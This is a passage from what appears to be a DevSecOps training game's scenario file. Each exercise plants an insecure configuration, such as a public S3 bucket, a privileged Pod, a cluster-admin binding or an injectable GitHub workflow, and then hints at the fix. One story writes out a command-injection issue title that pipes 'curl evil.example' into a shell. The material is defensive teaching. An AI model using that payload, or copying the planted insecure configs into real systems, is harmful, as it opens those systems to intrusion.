        "Fix the query: rows = db.query(\"SELECT id, title FROM books WHERE title ILIKE %s\", (f\"%{q}%\",)). Commit, pipeline."
      ],
      lesson: "A gate that cannot fail is decoration. Temporary bypasses need an owner and an expiry, and CODEOWNERS on the workflow catches them in review.",
      tries: ["pipeline", "grep -n -B2 continue-on-error .github/workflows/ci.yml"]
    },

    // --- Containers ---
    {
      id: "root", group: "Containers", level: "06", title: "Image runs as root",
      story: "Staging deploys fail since the Dockerfile was tidied up: Pods sit in CreateContainerConfigError. The namespace requires runAsNonRoot.",
      goal: "Run the app as a non-root user without weakening the Pod's security context.",
      setup(s) {
        s.commit("Tidy the Dockerfile", { Dockerfile: s.edit("Dockerfile", "USER 10001\n", "") }, { daysAgo: 1, push: true });
        pipeline(s);
      },
      checks: [
        ["The image's last USER is a numeric, non-zero ID", (s) => { const u = R.parseDockerfile(head(s, "Dockerfile")).filter((x) => x.instr === "USER").pop(); return !!u && /^[1-9]\d*$/.test(u.args.split(":")[0]); }],
        ["The Deployment still requires runAsNonRoot", (s) => /runAsNonRoot: true/.test(head(s, "k8s/deployment.yaml"))],
        PASSES, INTACT
      ],
      hints: [
        "kubectl describe pod api -n shop shows the kubelet's error.",
        "Removing runAsNonRoot hides it; kube-linter then fails. USER app does not help either: the kubelet cannot verify a name is non-root.",
        "Add USER 10001 before EXPOSE in the Dockerfile (sed -i 's/^EXPOSE 8080/USER 10001\\nEXPOSE 8080/' Dockerfile), commit, pipeline."
      ],
      lesson: "Run as a numeric non-root user in the image, and let the platform enforce it with runAsNonRoot. Root in a container is one kernel bug from root on the node.",
      tries: ["kubectl get pods -n shop", "kubectl describe pod api -n shop"]
    },
    {
      id: "base-image", group: "Containers", level: "06", title: "Base image full of CVEs",
      story: "The image scan blocks the release: 5 CRITICAL and 24 HIGH in OS packages. The Dockerfile moved to python:3.12 (full Debian, 431 packages) for a missing compiler.",
      goal: "Pass the image scan with a smaller attack surface: under 100 OS packages.",
      setup(s) {
        s.commit("Use the full Python image", { Dockerfile: D.FILES.Dockerfile.replace(/python:3\.12-slim/g, "python:3.12") }, { daysAgo: 2, push: true });
        pipeline(s);
      },
      checks: [["The final image's base has fewer than 100 OS packages", (s) => { const b = s.resolveBase(finalFrom(head(s, "Dockerfile")).ref || ""); return !b.error && b.base.packages < 100; }], PASSES, INTACT],
      hints: [
        "docker build -t ghcr.io/fernleaf/api:dev . then trivy image --severity HIGH,CRITICAL ghcr.io/fernleaf/api:dev. Note how many are in packages the app never uses.",
        "apt-get upgrade fixes some and leaves the rest, plus 431 packages to patch forever. --ignore-unfixed in CI hides real risk. Change the base.",
        "Only the build stage needs a compiler. sed -i 's/python:3.12$/python:3.12-slim/' Dockerfile (or python:3.12-slim on both FROM lines), commit, pipeline."
      ],
      lesson: "The fewer packages in the final image, the fewer CVEs to triage. Build in a full image if you must; ship from slim, alpine or distroless.",
      tries: ["trivy image --severity HIGH,CRITICAL ghcr.io/fernleaf/api:1.0.0", "cat Dockerfile"]
    },
    {
      id: "latest-tag", group: "Containers", level: "06", title: "Base image on :latest",
      story: "Last night's build broke with no code change: pip could not build imgresize. The Dockerfile uses python:latest, which moved from Python 3.12 to 3.13.",
      goal: "Pin the base image so builds only change when you change them.",
      setup(s) {
        s.commit("Always use the newest Python", { Dockerfile: D.FILES.Dockerfile.replace(/python:3\.12-slim/g, "python:latest") }, { daysAgo: 30, push: true });
        s.trivyDbCached = true;
      },
      checks: [["Every FROM names a version tag (a digest is better)", (s) => R.parseDockerfile(head(s, "Dockerfile")).filter((x) => x.instr === "FROM").every((x) => { const f = R.parseFrom(x.args); return !!f.digest || (!!f.tag && f.tag !== "latest" && /\d/.test(f.tag)); })], PASSES, INTACT],
      hints: [
        "pipeline shows the build error. docker pull python:latest shows what it points to today.",
        "python:3 moves too. Pin the exact line you tested: python:3.12-slim, and ideally its digest.",
        "docker buildx imagetools inspect python:3.12-slim prints the digest. sed -i 's/python:latest/python:3.12-slim/g' Dockerfile (append @sha256:... for a digest pin), commit, pipeline."
      ],
      lesson: "Floating tags make builds non-reproducible and let upstream changes in silently. Pin versions and digests, and let a bot (Dependabot, Renovate) propose updates you can review.",
      tries: ["pipeline", "docker pull python:latest"]
    },

    // --- Infrastructure as code ---
    {
      id: "public-bucket", group: "Infrastructure as code", level: "07", title: "Public S3 bucket",
      story: "checkov blocks a Terraform change: the invoices bucket gets a public-read ACL and its public access block is switched off, so customers could open invoice links.",
      goal: "Keep the invoices bucket private.",
      setup(s) {
        let tf = s.edit("terraform/main.tf", "  block_public_acls       = true\n", "  block_public_acls       = false\n");
        tf = tf.replace("  ignore_public_acls      = true\n", "  ignore_public_acls      = false\n");
        tf += `\nresource "aws_s3_bucket_acl" "invoices" {\n  bucket = aws_s3_bucket.invoices.id\n  acl    = "public-read"\n}\n`;
        s.commit("Public invoice links", { "terraform/main.tf": tf }, { daysAgo: 0, push: true });
      },
      checks: [
        ["No public ACL on the bucket", (s) => !tfIds(s).includes("CKV_AWS_20")],
        ["All four public access block settings are true", (s) => !tfIds(s).some((id) => /CKV_AWS_5[3-6]/.test(id))],
        PASSES, INTACT
      ],
      hints: [
        "checkov -d terraform lists the failed checks and the resource lines.",
        "A #checkov:skip comment makes the scan pass and the bucket public. For shareable links, use presigned URLs that expire.",
        "In terraform/main.tf delete the aws_s3_bucket_acl block (edit terraform/main.tf) and set block_public_acls and ignore_public_acls back to true (sed -i 's/= false/= true/' terraform/main.tf). Commit, pipeline."
      ],
      lesson: "Invoices hold personal data; public buckets are one of the most common cloud leaks. Block public access at the bucket (and account) and share with presigned URLs.",
      tries: ["checkov -d terraform", "grep -n public terraform/main.tf"]
    },
    {
      id: "ssh-open", group: "Infrastructure as code", level: "07", title: "SSH open to 0.0.0.0/0",
      story: "checkov flags a new bastion security group: port 22 open to the whole internet, added during an outage.",
      goal: "Nothing but HTTPS on the load balancer may be open to the internet.",
      setup(s) {
        s.commit("Bastion for debugging", { "terraform/main.tf": s.read("terraform/main.tf") + `\nresource "aws_security_group" "bastion" {\n  name   = "fernleaf-bastion"\n  vpc_id = var.vpc_id\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = "tcp"\n    cidr_blocks = ["0.0.0.0/0"]\n  }\n}\n` }, { daysAgo: 0, push: true });
      },
      checks: [
        ["No ingress from 0.0.0.0/0 or ::/0 except 443 on the load balancer", (s) => R.resources(head(s, "terraform/main.tf")).filter((r) => r.type === "aws_security_group").every((r) => r.blocks.filter((b) => b.type === "ingress").every((b) => {
          const v = (k) => (b.attrs[k] ? b.attrs[k].value : []);
          const pub = [].concat(v("cidr_blocks"), v("ipv6_cidr_blocks")).some((c) => c === "0.0.0.0/0" || c === "::/0");
          return !pub || (r.name === "lb" && Number(v("from_port")) === 443 && Number(v("to_port")) === 443);
        }))],
        PASSES, INTACT
      ],
      hints: [
        "checkov -d terraform shows CKV_AWS_24 and the block.",
        "Moving SSH to port 2222 passes CKV_AWS_24 and fools nobody: scanners check rules, attackers scan every port.",
        "Restrict the source to the VPN range (sed -i 's#cidr_blocks = \\[\"0.0.0.0/0\"\\]#cidr_blocks = [\"10.20.0.0/16\"]#2' terraform/main.tf changes the second one), or delete the bastion and use SSM Session Manager. Commit, pipeline."
      ],
      lesson: "Exposed SSH gets brute-forced within minutes. Prefer no inbound admin port at all (SSM Session Manager); otherwise allow only your VPN range.",
      tries: ["checkov -d terraform", "grep -n cidr terraform/main.tf"]
    },
    {
      id: "unencrypted", group: "Infrastructure as code", level: "07", title: "Unencrypted EBS and RDS",
      story: "An audit found the uploads volume and the orders database unencrypted at rest after a module copy-paste.",
      goal: "Encrypt both.",
      setup(s) {
        s.commit("Resize storage", { "terraform/main.tf": s.edit("terraform/main.tf", "  encrypted         = true\n", "  encrypted         = false\n").replace("  storage_encrypted   = true\n", "  storage_encrypted   = false\n") }, { daysAgo: 4, push: true });
      },
      checks: [["The EBS volume is encrypted", (s) => !tfIds(s).includes("CKV_AWS_3")], ["The RDS instance is encrypted", (s) => !tfIds(s).includes("CKV_AWS_16")], PASSES, INTACT],
      hints: [
        "checkov -d terraform lists CKV_AWS_3 and CKV_AWS_16.",
        "Fixing one passes one check. Both resources need it.",
        "sed -i 's/encrypted         = false/encrypted         = true/;s/storage_encrypted   = false/storage_encrypted   = true/' terraform/main.tf, commit, pipeline. On a live database this replaces it: snapshot, copy encrypted, restore."
      ],
      lesson: "Encryption at rest is cheap to set at creation and expensive to add later, which is why it belongs in the plan review, not the audit.",
      tries: ["checkov -d terraform", "grep -n encrypted terraform/main.tf"]
    },
    {
      id: "iam-wildcard", group: "Infrastructure as code", level: "07", title: "IAM policy with * on *",
      story: "To fix an AccessDenied quickly, someone gave the app role Action \"*\" on Resource \"*\": full admin for anyone who gets code execution in the API.",
      goal: "Give the app only what it uses: read and write invoices in its bucket.",
      setup(s) {
        s.commit("Fix AccessDenied on invoices", { "terraform/main.tf": s.edit("terraform/main.tf", `      Action   = ["s3:PutObject", "s3:GetObject"]\n      Resource = "\${aws_s3_bucket.invoices.arn}/invoices/*"`, `      Action   = "*"\n      Resource = "*"`) }, { daysAgo: 2, push: true });
      },
      checks: [
        ["No wildcard action or resource", (s) => !tfIds(s).some((id) => id === "CKV_AWS_62" || id === "PRACTICE-AWS-07")],
        ["The role can still put objects in the invoices bucket", (s) => /s3:PutObject/.test(head(s, "terraform/main.tf")) && /invoices\.arn/.test(head(s, "terraform/main.tf"))],
        PASSES, INTACT
      ],
      hints: [
        "checkov -d terraform shows CKV_AWS_62. trivy config terraform also shows narrower wildcards.",
        "\"s3:*\" on \"*\" passes CKV_AWS_62 but still lets the app delete every bucket. Name actions and resources.",
        "Edit terraform/main.tf: Action = [\"s3:PutObject\", \"s3:GetObject\"] and Resource = \"${aws_s3_bucket.invoices.arn}/invoices/*\". Commit, pipeline."
      ],
      lesson: "Least privilege limits the blast radius of every other bug. IAM Access Analyzer can generate a policy from what the role really used.",
      tries: ["checkov -d terraform", "trivy config terraform"]
    },
    {
      id: "cloudtrail", group: "Infrastructure as code", level: "13", title: "CloudTrail blind spots",
      story: "During an incident the team could not see activity in eu-west-3, and could not prove logs had not been altered. The trail is single-region, without log validation.",
      goal: "Log every region and make tampering detectable.",
      setup(s) {
        s.commit("Cut CloudTrail costs", { "terraform/main.tf": s.edit("terraform/main.tf", "  is_multi_region_trail      = true\n  enable_log_file_validation = true\n", "  is_multi_region_trail      = false\n  enable_log_file_validation = false\n") }, { daysAgo: 60, push: true });
      },
      checks: [["The trail covers all regions", (s) => !tfIds(s).includes("CKV_AWS_67")], ["Log file validation is on", (s) => !tfIds(s).includes("CKV_AWS_36")], PASSES, INTACT],
      hints: [
        "checkov -d terraform shows CKV_AWS_67 and CKV_AWS_36.",
        "Attackers start where you do not look: regions you never use.",
        "sed -i 's/trail      = false/trail      = true/;s/validation = false/validation = true/' terraform/main.tf, commit, pipeline. (A plain s/= false/= true/ would also make the database public.)"
      ],
      lesson: "Detection needs complete, trustworthy logs before the incident. Multi-region trails and log validation are the baseline in the CIS AWS Foundations Benchmark.",
      tries: ["checkov -d terraform", "grep -n trail terraform/main.tf"]
    },

    // --- Kubernetes ---
    {
      id: "privileged", group: "Kubernetes", level: "08", title: "Privileged Pod with the Docker socket",
      story: "kube-linter blocks a change: a debug sidecar runs privileged and mounts the node's container runtime socket. Whoever gets into it owns the node.",
      goal: "Ship the Deployment without privileged containers or host mounts.",
      setup(s) {
        const dep = s.edit("k8s/deployment.yaml", "          volumeMounts:\n            - name: tmp\n              mountPath: /tmp\n      volumes:\n        - name: tmp\n          emptyDir: {}\n",
          "          volumeMounts:\n            - name: tmp\n              mountPath: /tmp\n        - name: debug\n          image: busybox:1.36\n          command: [\"sleep\", \"86400\"]\n          securityContext:\n            privileged: true\n          resources:\n            limits:\n              memory: 64Mi\n          volumeMounts:\n            - name: runtime\n              mountPath: /var/run/docker.sock\n      volumes:\n        - name: tmp\n          emptyDir: {}\n        - name: runtime\n          hostPath:\n            path: /var/run/docker.sock\n");
        s.commit("Debug sidecar", { "k8s/deployment.yaml": dep }, { daysAgo: 0, push: true });
      },
      checks: [
        ["No privileged container and no hostPath volume", (s) => !R.checkK8s(head(s, "k8s/deployment.yaml")).some((f) => /privileged-container|docker-sock|sensitive-host-mounts/.test(f.id))],
        PASSES, INTACT
      ],
      hints: [
        "kube-linter lint k8s/ lists each problem with its check name.",
        "privileged: false alone still leaves the runtime socket; an ignore-check annotation hides both. Use kubectl debug for live debugging instead.",
        "Restore the Deployment from before the sidecar: git checkout HEAD~1 -- k8s/deployment.yaml, commit, pipeline."
      ],
      lesson: "privileged, hostPath and the runtime socket each hand over the node. Ephemeral debug containers (kubectl debug) give access without changing the workload.",
      tries: ["kube-linter lint k8s/", "git show --stat HEAD"]
    },
    {
      id: "netpol", group: "Kubernetes", level: "08", title: "Missing NetworkPolicy",
      story: "A penetration tester reached the orders database from a batch job in another namespace. Nine days ago someone deleted k8s/networkpolicy.yaml because it \"broke metrics\".",
      goal: "Close the namespace again: only the API reaches the database, the ingress reaches the API, and Prometheus can scrape it.",
      setup(s) {
        const np = D.FILES["k8s/networkpolicy.yaml"].replace(/---\napiVersion: networking\.k8s\.io\/v1\nkind: NetworkPolicy\nmetadata:\n  name: api-metrics-from-monitoring[\s\S]*?port: 9090\n/, "");
        s.commit("Network policies", { "k8s/networkpolicy.yaml": np }, { daysAgo: 30 });
        s.commit("Remove network policies, they broke metrics", { "k8s/networkpolicy.yaml": null }, { daysAgo: 9, push: true });
        s.cluster.objects = s.k8sDocs(s.head().tree);
      },
      checks: [
        ["Other namespaces cannot reach postgres", (s) => !s.reach({ ns: "jobs", labels: { app: "batch-worker" } }, { ns: "shop", labels: { app: "postgres" } }, 5432)],
        ["Prometheus can scrape the API on 9090", (s) => s.reach({ ns: "monitoring", labels: { app: "prometheus" } }, { ns: "shop", labels: { app: "api" } }, 9090)],
        ["The ingress controller reaches the API on 8080", (s) => s.reach({ ns: "ingress-nginx", labels: { app: "ingress-nginx" } }, { ns: "shop", labels: { app: "api" } }, 8080)],
        PASSES, INTACT
      ],
      hints: [
        "kubectl exec -n jobs deploy/batch-worker -- nc -zv postgres.shop:5432 shows the hole. git log --diff-filter=D --oneline -- k8s/networkpolicy.yaml finds the deletion.",
        "Bring the file back from the commit before: git checkout <sha>~1 -- k8s/networkpolicy.yaml. Then add the rule that was missing: Prometheus in the monitoring namespace to the api Pods on port 9090.",
        "Append a NetworkPolicy (edit k8s/networkpolicy.yaml): podSelector app: api, ingress from namespaceSelector kubernetes.io/metadata.name: monitoring, port 9090. Commit, pipeline, then test with kubectl exec."
      ],
      lesson: "Default deny plus explicit allows means a broken feature shows up as a missing rule to add, not a reason to open everything.",
      tries: ["kubectl exec -n jobs deploy/batch-worker -- nc -zv postgres.shop:5432", "git log --diff-filter=D --oneline -- k8s/networkpolicy.yaml"]
    },
    {
      id: "rbac", group: "Kubernetes", level: "08", title: "ServiceAccount bound to cluster-admin",
      story: "kube-linter blocks the release: the api ServiceAccount is bound to cluster-admin. It was done to fix a forbidden error reading its ConfigMap.",
      goal: "Let the API read its ConfigMap and nothing else.",
      setup(s) {
        s.commit("Fix forbidden on api-config", { "k8s/rbac.yaml": "apiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: api\n  namespace: shop\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: api-admin\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n  - kind: ServiceAccount\n    name: api\n    namespace: shop\n" }, { daysAgo: 1, push: true });
      },
      checks: [
        ["Not bound to cluster-admin", (s) => !R.checkK8s(head(s, "k8s/rbac.yaml")).some((f) => f.id === "cluster-admin-role-binding")],
        ["It can get the api-config ConfigMap", (s) => s.canI("system:serviceaccount:shop:api", "get", "configmaps", "shop", "api-config", s.k8sDocs(s.head().tree))],
        ["It cannot read Secrets", (s) => !s.canI("system:serviceaccount:shop:api", "get", "secrets", "shop", null, s.k8sDocs(s.head().tree))],
        PASSES, INTACT
      ],
      hints: [
        "kubectl auth can-i get secrets --as=system:serviceaccount:shop:api -n shop says yes: that is the problem.",
        "Deleting the binding brings the forbidden error back. The app needs a Role with get on configmaps named api-config, in shop.",
        "git checkout HEAD~1 -- k8s/rbac.yaml restores the Role and RoleBinding. Commit, pipeline, then check with kubectl auth can-i."
      ],
      lesson: "Fix forbidden errors with the narrowest grant that works: a namespaced Role, specific resources and verbs.",
      tries: ["kubectl auth can-i get secrets --as=system:serviceaccount:shop:api -n shop", "kube-linter lint k8s/"]
    },
    {
      id: "k8s-secret", group: "Kubernetes", level: "08", title: "Kubernetes Secret committed to git",
      story: "conftest fails: k8s/secret.yaml holds the database password, base64-encoded. It was pushed six days ago to make a staging deploy work.",
      goal: "Remove it from git and its history, and rotate the password.",
      setup(s) {
        s.commit("Add the orders-db Secret", { "k8s/secret.yaml": `apiVersion: v1\nkind: Secret\nmetadata:\n  name: orders-db\n  namespace: shop\ntype: Opaque\ndata:\n  password: ${btoa(DB_PW)}\n` }, { daysAgo: 6, push: true });
      },
      checks: [
        ["The password was rotated", (s) => s.rotated("prod/orders/db")],
        ["k8s/secret.yaml is gone from every commit on GitHub", (s) => s.pushed() && !s.remoteHasPath("k8s/secret.yaml")],
        PASSES, INTACT
      ],
      hints: [
        "cat k8s/secret.yaml, then echo the value | base64 -d: base64 is an encoding, not encryption.",
        "The Secret comes from the secret store through External Secrets; the file only duplicates it. Rotate: aws secretsmanager rotate-secret --secret-id prod/orders/db.",
        "git filter-repo --path k8s/secret.yaml --invert-paths --force, git remote add origin git@github.com:fernleaf/api.git, git push --force origin main, pipeline."
      ],
      lesson: "Kubernetes Secrets are base64, readable by anyone with the file. Keep values in a secret store and sync them (External Secrets, Sealed Secrets, SOPS).",
      tries: ["conftest test k8s/", "cat k8s/secret.yaml"]
    },

    // --- CI/CD and supply chain ---
    {
      id: "unpinned-action", group: "CI/CD and supply chain", level: "09", title: "Unpinned GitHub Action",
      story: "zizmor fails the workflow audit: a new step uses actions/setup-python@v6. Tags can be moved; in March 2025 the tags of tj-actions/changed-files were repointed to a malicious commit (CVE-2025-30066).",
      goal: "Pin every action to a full commit SHA.",
      setup(s) {
        s.commit("Set up Python in CI", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", "      - uses: ./.github/actions/install-tools\n      - name: Secret scan", "      - uses: actions/setup-python@v6\n        with:\n          python-version: \"3.12\"\n      - uses: ./.github/actions/install-tools\n      - name: Secret scan") }, { daysAgo: 0, push: true });
      },
      checks: [["Every action is pinned to a 40-character SHA", (s) => !s.workflows(s.head().tree).some((f) => f.id === "unpinned-uses")], PASSES, INTACT],
      hints: [
        "zizmor .github/workflows/ points at the line.",
        "@v6.3.0 is still a tag, and a short SHA is rejected. Find the commit the tag points to: git ls-remote https://github.com/actions/setup-python refs/tags/v6.3.0",
        "sed -i 's#actions/setup-python@v6#actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1 \\# v6.3.0#' .github/workflows/ci.yml, commit, pipeline."
      ],
      lesson: "A SHA cannot be moved; a tag can. Pin by SHA with the version as a comment, and let Dependabot propose updates.",
      tries: ["zizmor .github/workflows/", "git ls-remote https://github.com/actions/setup-python"]
    },
    {
      id: "script-injection", group: "CI/CD and supply chain", level: "09", title: "Script injection in a workflow",
      story: "zizmor flags the new issue triage workflow: it puts the issue title straight into a shell script. An issue titled a\"; curl evil.example | sh; echo \" would run with a token that can edit issues.",
      goal: "Use the title as data, never as code.",
      setup(s) {
        s.commit("Label bug reports", { ".github/workflows/triage.yml": `name: triage

on:
  issues:
    types: [opened]

permissions:
  contents: read

jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      issues: write
    steps:
      - name: Label bug reports
        env:
          GH_TOKEN: \${{ github.token }}
        run: |
          echo "New issue: \${{ github.event.issue.title }}"
          if echo "\${{ github.event.issue.title }}" | grep -qi bug; then
            gh issue edit "\${{ github.event.issue.number }}" --add-label bug --repo "\${{ github.repository }}"
          fi
` }, { daysAgo: 0, push: true });
      },
      checks: [["No untrusted input is expanded inside run:", (s) => !s.workflows(s.head().tree).some((f) => f.id === "template-injection")], PASSES, INTACT],
      hints: [
        "zizmor .github/workflows/ flags template-injection on two lines.",
        "${{ }} is pasted into the script before the shell runs, so quotes do not help. Pass it through an environment variable.",
        "Add TITLE: ${{ github.event.issue.title }} under env:, then use \"$TITLE\" in both lines (sed -i 's/\\${{ github.event.issue.title }}/$TITLE/' twice, or edit the file). Commit, pipeline."
      ],
      lesson: "Untrusted event fields (titles, bodies, branch names) must reach scripts as environment variables, never as ${{ }} expansions (OWASP Top 10 CI/CD Security Risks: poisoned pipeline execution).",
      tries: ["zizmor .github/workflows/", "cat .github/workflows/triage.yml"]
    },
    {
      id: "token-perms", group: "CI/CD and supply chain", level: "09", title: "Overly broad GITHUB_TOKEN",
      story: "zizmor and Scorecard flag ci.yml: permissions: write-all at the top, so every job, including the ones running third-party scanners, can push code and publish packages.",
      goal: "Read-only by default; only the build job writes packages and gets an OIDC token.",
      setup(s) {
        const ci = s.edit(".github/workflows/ci.yml", "permissions:\n  contents: read\n\njobs:", "permissions: write-all\n\njobs:").replace("    permissions:\n      contents: read\n      packages: write\n      id-token: write\n", "");
        s.commit("Fix permission errors", { ".github/workflows/ci.yml": ci }, { daysAgo: 3, push: true });
      },
      checks: [
        ["The workflow default is contents: read", (s) => { const wf = R.parseYaml(head(s, ".github/workflows/ci.yml")).docs[0] || {}; return wf.permissions && wf.permissions.contents === "read" && Object.keys(wf.permissions).length === 1; }],
        ["The build job alone has packages: write and id-token: write", (s) => { const wf = R.parseYaml(head(s, ".github/workflows/ci.yml")).docs[0] || {}; const p = ((wf.jobs || {}).build || {}).permissions || {}; return p.packages === "write" && p["id-token"] === "write"; }],
        PASSES, INTACT
      ],
      hints: [
        "zizmor .github/workflows/ shows excessive-permissions.",
        "Setting the top to contents: read alone breaks the push (packages: write) and keyless signing (id-token: write). Grant those on the build job.",
        "git checkout HEAD~1 -- .github/workflows/ci.yml restores both blocks. Commit, pipeline."
      ],
      lesson: "Give the token the least it needs per job. A compromised step can only do what its token allows.",
      tries: ["zizmor .github/workflows/", "grep -n -A3 permissions .github/workflows/ci.yml"]
    },
    {
      id: "unsigned-image", group: "CI/CD and supply chain", level: "10", title: "Unsigned image deployed",
      story: "An auditor asks who built what runs in staging. Nobody can say: someone pushed ghcr.io/fernleaf/api:hotfix-2 from a laptop and it was deployed, because the signature policy only audits and CI stopped signing when the step was removed.",
      goal: "CI signs every image, the cluster refuses unsigned ones, and staging runs a CI-signed image.",
      setup(s) {
        s.commit("Remove signing (Rekor timeouts)", {
          ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", '          cosign sign --yes "$IMAGE"\n', ""),
          "k8s/verify-images.yaml": s.edit("k8s/verify-images.yaml", "validationFailureAction: Enforce", "validationFailureAction: Audit")
        }, { daysAgo: 14, push: true });
        const img = s.build(s.head().tree, `${IMAGE_REPO}:hotfix-2`, {}).image;
        s.registry[`${IMAGE_REPO}:hotfix-2`] = { image: img, digest: img.digest, sigs: [], atts: [] };
        s.deployFromTree(s.head().tree, false, `${IMAGE_REPO}:hotfix-2`);
      },
      checks: [
        ["CI signs the image (cosign sign)", (s) => /cosign sign/.test(head(s, ".github/workflows/ci.yml"))],
        ["The cluster policy enforces signatures", (s) => /validationFailureAction: Enforce/.test(head(s, "k8s/verify-images.yaml"))],
        ["Staging runs the latest release, signed by the CI workflow", (s) => !!release(s) && release(s).sigs.some((x) => x.identity === CI_IDENTITY)],
        PASSES, INTACT
      ],
      hints: [
        "cosign verify --certificate-identity https://github.com/fernleaf/api/.github/workflows/ci.yml@refs/heads/main --certificate-oidc-issuer https://token.actions.githubusercontent.com ghcr.io/fernleaf/api:hotfix-2",
        "Signing from your laptop gives your identity, which the policy rightly rejects. Enforcing without signing blocks every deploy. Do both, in CI.",
        "Add cosign sign --yes \"$IMAGE\" back before cosign attest in ci.yml (git checkout HEAD~1 -- .github/workflows/ci.yml), set validationFailureAction: Enforce (sed -i 's/Audit/Enforce/' k8s/verify-images.yaml), commit, pipeline."
      ],
      lesson: "Keyless signing ties an image to the workflow that built it; admission policy makes that the only way in (SLSA: provenance you can verify at deploy).",
      tries: ["cosign tree ghcr.io/fernleaf/api:hotfix-2", "kubectl get policyreport -n shop"]
    },
    {
      id: "missing-sbom", group: "CI/CD and supply chain", level: "05", title: "Missing SBOM for an audit",
      story: "A customer's auditor wants the software bill of materials for what runs in staging. The release gate requires one, but the SBOM and attest steps were dropped from ci.yml to save a minute.",
      goal: "Generate a CycloneDX SBOM in CI, attest it to the image, and release.",
      setup(s) {
        s.commit("Speed up the build", { ".github/workflows/ci.yml": s.edit(".github/workflows/ci.yml", '      - name: SBOM (syft)\n        run: syft "$IMAGE" -o cyclonedx-json=sbom.cdx.json\n', "").replace('          cosign attest --yes --type cyclonedx --predicate sbom.cdx.json "$IMAGE"\n', "") }, { daysAgo: 1, push: true });
      },
      checks: [
        ["CI runs syft and cosign attest --type cyclonedx", (s) => /syft/.test(head(s, ".github/workflows/ci.yml")) && /cosign attest[^\n]*--type cyclonedx/.test(head(s, ".github/workflows/ci.yml"))],
        ["Staging runs the latest release, with a CycloneDX attestation", (s) => !!release(s) && release(s).atts.includes("cyclonedx")],
        PASSES, INTACT
      ],
      hints: [
        "pipeline: the release gate says sbom: required. cosign tree ghcr.io/fernleaf/api:1.0.0 shows what a complete release carries.",
        "An SBOM file in an artifact store is easy to lose and hard to trust; attest it to the image digest so it travels with the image.",
        "git checkout HEAD~1 -- .github/workflows/ci.yml, commit, pipeline. Then cosign verify-attestation --type cyclonedx --certificate-identity ... on the new image."
      ],
      lesson: "An SBOM answers \"are we affected?\" in minutes when the next advisory lands. Generate it per image, attest it, keep it (NIST SSDF PS.3).",
      tries: ["pipeline", "cosign tree ghcr.io/fernleaf/api:1.0.0"]
    },
    {
      id: "scorecard", group: "CI/CD and supply chain", level: "10", title: "Low OpenSSF Scorecard",
      story: "Scorecard dropped to 4.6: a new preview workflow runs on pull_request_target, checks out the pull request's code and runs it, with a write-all token.",
      goal: "Remove the dangerous pattern and get Scorecard to 7 or higher.",
      setup(s) {
        s.commit("Preview builds for pull requests", { ".github/workflows/pr-preview.yml": `name: pr-preview

on:
  pull_request_target:

permissions: write-all

jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: ${D.CHECKOUT}
        with:
          ref: \${{ github.event.pull_request.head.sha }}
          persist-credentials: false
      - run: make preview
` }, { daysAgo: 2, push: true });
      },
      checks: [["Scorecard is 7 or higher", (s) => root.DSShell.scorecardScore(s, s.head().tree) >= 7], ["No workflow runs pull request code with secrets", (s) => !s.workflows(s.head().tree).some((f) => f.id === "dangerous-triggers")], PASSES, INTACT],
      hints: [
        "scorecard --repo=github.com/fernleaf/api shows Dangerous-Workflow and Token-Permissions at 0.",
        "pull_request_target runs in the base repository's context with its secrets. Building fork code there hands them over. on: pull_request runs fork code without secrets.",
        "sed -i 's/pull_request_target:/pull_request:/;s/permissions: write-all/permissions:\\n  contents: read/' .github/workflows/pr-preview.yml and drop the ref: line (or delete the workflow). Commit, pipeline, scorecard."
      ],
      lesson: "Scorecard turns supply-chain hygiene into checks you can track; dangerous workflows cap it because one can give away the repository.",
      tries: ["scorecard --repo=github.com/fernleaf/api", "zizmor .github/workflows/"]
    },
    {
      id: "oidc", group: "CI/CD and supply chain", level: "09", title: "Long-lived cloud keys in CI",
      story: "A security review found the deploy job uses an IAM user's access key, stored as repository secrets three years ago and never rotated.",
      goal: "Deploy with OIDC (short-lived credentials), then delete the stored keys.",
      setup(s) {
        s.addKey("fernleaf-ci", CI_KEY, "PRACTICE/ci/0nlyF0rTr4iningNotReal+K3y0", { created: NOW - 1100 * DAY });
        s.gh.secrets.AWS_ACCESS_KEY_ID = CI_KEY;
        s.gh.secrets.AWS_SECRET_ACCESS_KEY = "PRACTICE/ci/0nlyF0rTr4iningNotReal+K3y0";
        const ci = s.edit(".github/workflows/ci.yml", "          role-to-assume: arn:aws:iam::111122223333:role/fernleaf-staging-deploy\n", "          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}\n          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n")
          .replace("    environment: staging\n    permissions:\n      contents: read\n      id-token: write\n", "    environment: staging\n    permissions:\n      contents: read\n");
        s.commit("Deploy with the CI user", { ".github/workflows/ci.yml": ci }, { daysAgo: 1100, push: true });
      },
      checks: [
        ["The deploy job uses role-to-assume with id-token: write", (s) => !s.workflows(s.head().tree).some((f) => f.id === "long-lived-cloud-keys") && /role-to-assume/.test(head(s, ".github/workflows/ci.yml"))],
        ["The keys are deleted from GitHub secrets", (s) => !s.gh.secrets.AWS_ACCESS_KEY_ID && !s.gh.secrets.AWS_SECRET_ACCESS_KEY],
        ["The IAM user's key is deactivated or deleted", (s) => !s.keyActive(CI_KEY)],
        PASSES, INTACT
      ],
      hints: [
        "grep -n -B2 -A4 configure-aws-credentials .github/workflows/ci.yml. The role arn:aws:iam::111122223333:role/fernleaf-staging-deploy already trusts this repository's workflows.",
        "Order matters: switch to OIDC and see the deploy pass before you delete the keys. role-to-assume without id-token: write fails with an OIDC hint.",
        "git checkout HEAD~1 -- .github/workflows/ci.yml, commit, pipeline. Then gh secret delete AWS_ACCESS_KEY_ID, gh secret delete AWS_SECRET_ACCESS_KEY, aws iam update-access-key --user-name fernleaf-ci --access-key-id AKIAPRACTICE6CIQZ7KT --status Inactive."
      ],
      lesson: "OIDC gives each run credentials that expire in an hour and are bound to the repository and branch. Nothing long-lived is left to leak.",
